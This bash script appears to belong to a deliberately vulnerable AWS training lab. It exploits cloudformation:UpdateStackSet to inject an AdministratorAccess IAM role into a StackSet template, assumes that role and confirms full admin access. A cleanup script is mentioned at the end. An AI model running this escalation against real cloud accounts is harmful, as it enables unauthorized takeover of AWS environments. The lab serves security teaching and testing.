#!/bin/bash

# Demo script for cloudformation:UpdateStackSet privilege escalation
# This scenario demonstrates how a user with cloudformation:UpdateStackSet permission
# can modify an existing StackSet that uses an administrative execution role to create
# a new escalated role, which they can then assume for full admin access.

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-prcuss-to-admin-starting-user"
STACKSET_NAME="pl-prod-prcuss-to-admin-stackset"
ADMIN_ROLE_NAME="pl-prod-prcuss-to-admin-stackset-admin-role"
EXECUTION_ROLE_NAME="pl-prod-prcuss-to-admin-stackset-execution-role"
ESCALATED_ROLE_NAME="pl-prod-prcuss-to-admin-escalated-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}iam:PassRole + CloudFormation UpdateStackSet Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Disable OTEL to prevent terraform output issues
export OTEL_TRACES_EXPORTER=""

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_passrole_cloudformation_updatestackset.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region and resource suffix (needed later)
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
RESOURCE_SUFFIX=$(terraform output -raw resource_suffix 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

if [ -z "$RESOURCE_SUFFIX" ]; then
    echo -e "${RED}Error: Could not retrieve resource_suffix from Terraform${NC}"
    exit 1
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "Resource Suffix: $RESOURCE_SUFFIX"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Describe the existing CloudFormation StackSet
echo -e "${YELLOW}Step 5: Inspecting the existing CloudFormation StackSet${NC}"
echo "StackSet name: $STACKSET_NAME"
echo ""
echo "StackSet details:"
aws cloudformation describe-stack-set \
    --region $AWS_REGION \
    --stack-set-name $STACKSET_NAME \
    --query 'StackSet.[StackSetName,Status,Description]' \
    --output table

echo ""
echo "Current StackSet template (benign - just creates an S3 bucket):"
aws cloudformation describe-stack-set \
    --region $AWS_REGION \
    --stack-set-name $STACKSET_NAME \
    --query 'StackSet.TemplateBody' \
    --output text | head -n 20

echo -e "${GREEN}✓ StackSet contains benign resources (S3 bucket)${NC}\n"

# Step 6: Create malicious CloudFormation template
echo -e "${YELLOW}Step 6: Creating malicious CloudFormation template${NC}"
echo "Creating template that adds an admin role we can assume..."

MALICIOUS_TEMPLATE=$(cat <<EOF
{
  "AWSTemplateFormatVersion": "2010-09-09",
  "Description": "Updated StackSet template - adds escalated admin role",
  "Resources": {
    "BenignBucket": {
      "Type": "AWS::S3::Bucket",
      "Properties": {
        "BucketName": "pl-prod-prcuss-benign-${ACCOUNT_ID}-${RESOURCE_SUFFIX}",
        "Tags": [
          {
            "Key": "Name",
            "Value": "pl-prod-prcuss-benign-bucket"
          },
          {
            "Key": "Environment",
            "Value": "prod"
          },
          {
            "Key": "Scenario",
            "Value": "cloudformation-updatestackset"
          },
          {
            "Key": "Purpose",
            "Value": "benign-initial-resource"
          }
        ]
      }
    },
    "EscalatedAdminRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "RoleName": "${ESCALATED_ROLE_NAME}",
        "AssumeRolePolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Principal": {
                "AWS": "arn:aws:iam::${ACCOUNT_ID}:user/${STARTING_USER}"
              },
              "Action": "sts:AssumeRole"
            }
          ]
        },
        "ManagedPolicyArns": [
          "arn:aws:iam::aws:policy/AdministratorAccess"
        ],
        "Tags": [
          {
            "Key": "Name",
            "Value": "${ESCALATED_ROLE_NAME}"
          },
          {
            "Key": "Environment",
            "Value": "prod"
          },
          {
            "Key": "Scenario",
            "Value": "cloudformation-updatestackset"
          },
          {
            "Key": "Purpose",
            "Value": "escalated-admin-role"
          }
        ]
      }
    }
  },
  "Outputs": {
    "BucketName": {
      "Description": "Name of the benign S3 bucket",
      "Value": {
        "Ref": "BenignBucket"
      }
    },
    "EscalatedRoleArn": {
      "Description": "ARN of the escalated admin role",
      "Value": {
        "Fn::GetAtt": [
          "EscalatedAdminRole",
          "Arn"
        ]
      }
    }
  }
}
EOF
)

# Save the template to a temporary file
echo "$MALICIOUS_TEMPLATE" > /tmp/malicious-stackset-template.json
echo "Malicious template saved to: /tmp/malicious-stackset-template.json"
echo ""
echo "Template adds:"
echo "  - EscalatedAdminRole: IAM role with AdministratorAccess"
echo "  - Trust policy allows: $STARTING_USER to assume the role"
echo -e "${GREEN}✓ Malicious template created${NC}\n"

# Step 7: Update the CloudFormation StackSet
echo -e "${YELLOW}Step 7: Updating CloudFormation StackSet with malicious template${NC}"
echo "Using cloudformation:UpdateStackSet permission..."
echo "StackSet will use its admin execution role to create the escalated role"
echo ""

ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE_NAME}"

echo "Administration Role ARN: $ADMIN_ROLE_ARN"
echo "Execution Role Name: $EXECUTION_ROLE_NAME"
echo ""

OPERATION_ID=$(aws cloudformation update-stack-set \
    --region $AWS_REGION \
    --stack-set-name $STACKSET_NAME \
    --template-body file:///tmp/malicious-stackset-template.json \
    --administration-role-arn $ADMIN_ROLE_ARN \
    --execution-role-name $EXECUTION_ROLE_NAME \
    --capabilities CAPABILITY_NAMED_IAM \
    --query 'OperationId' \
    --output text)

echo "StackSet update operation ID: $OPERATION_ID"
echo -e "${GREEN}✓ StackSet update initiated${NC}\n"

# Wait for UpdateStackSet to complete before calling UpdateStackInstances
echo -e "${YELLOW}Waiting for StackSet update to complete...${NC}"
echo "This may take a moment..."
echo ""

while true; do
    STACKSET_STATUS=$(aws cloudformation describe-stack-set-operation \
        --region $AWS_REGION \
        --stack-set-name $STACKSET_NAME \
        --operation-id $OPERATION_ID \
        --query 'StackSetOperation.Status' \
        --output text)

    echo "StackSet update status: $STACKSET_STATUS"

    if [ "$STACKSET_STATUS" == "SUCCEEDED" ]; then
        echo -e "${GREEN}✓ StackSet update completed successfully${NC}\n"
        break
    elif [ "$STACKSET_STATUS" == "FAILED" ] || [ "$STACKSET_STATUS" == "STOPPED" ]; then
        echo -e "${RED}✗ StackSet update failed${NC}"
        exit 1
    fi

    sleep 5
done

# Additional wait for IAM propagation
echo -e "${YELLOW}Waiting 15 seconds for IAM role to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ IAM role propagated${NC}\n"

# Step 8: Verify the escalated role was created
echo -e "${YELLOW}Step 8: Verifying escalated role was created${NC}"
ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$ESCALATED_ROLE_NAME"
echo "Role ARN: $ROLE_ARN"

if aws iam get-role --role-name $ESCALATED_ROLE_NAME &> /dev/null; then
    echo -e "${GREEN}✓ Escalated role exists${NC}"
else
    echo -e "${RED}✗ Escalated role not found${NC}"
    exit 1
fi
echo ""

# Step 9: Assume the escalated admin role
echo -e "${YELLOW}Step 9: Assuming the escalated admin role${NC}"
echo "Using sts:AssumeRole to get admin credentials..."
echo ""

CREDENTIALS=$(aws sts assume-role \
    --role-arn $ROLE_ARN \
    --role-session-name escalation-demo-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we assumed the role
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"

if [[ ! $ROLE_IDENTITY == *"$ESCALATED_ROLE_NAME"* ]]; then
    echo -e "${RED}Error: Failed to assume escalated role${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Successfully assumed escalated admin role${NC}\n"

# Step 10: Verify administrator access
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Described existing CloudFormation StackSet (benign S3 bucket)"
echo "3. Created malicious template with admin role"
echo "4. Used cloudformation:UpdateStackSet to update the StackSet template"
echo "5. Updated stack instances to deploy the changes"
echo "6. StackSet's admin execution role created the escalated role"
echo "7. Assumed the newly created escalated admin role"
echo "8. Achieved: Full administrator access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (cloudformation:UpdateStackSet) → StackSet (admin execution role)"
echo "  → Creates $ESCALATED_ROLE_NAME → (sts:AssumeRole) → Admin Access"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Escalated admin role: $ESCALATED_ROLE_NAME"
echo "- Modified CloudFormation StackSet: $STACKSET_NAME"
echo "- Template file: /tmp/malicious-stackset-template.json"

echo -e "\n${YELLOW}Key Vulnerability:${NC}"
echo "The CloudFormation StackSet has an administrative execution role, and the user"
echo "can update the StackSet template. This allows creating any resource the execution"
echo "role has permissions for, including IAM roles with trust policies that grant"
echo "access back to the attacker."

echo -e "\n${RED}⚠ Warning: The escalated role and modified StackSet remain active${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
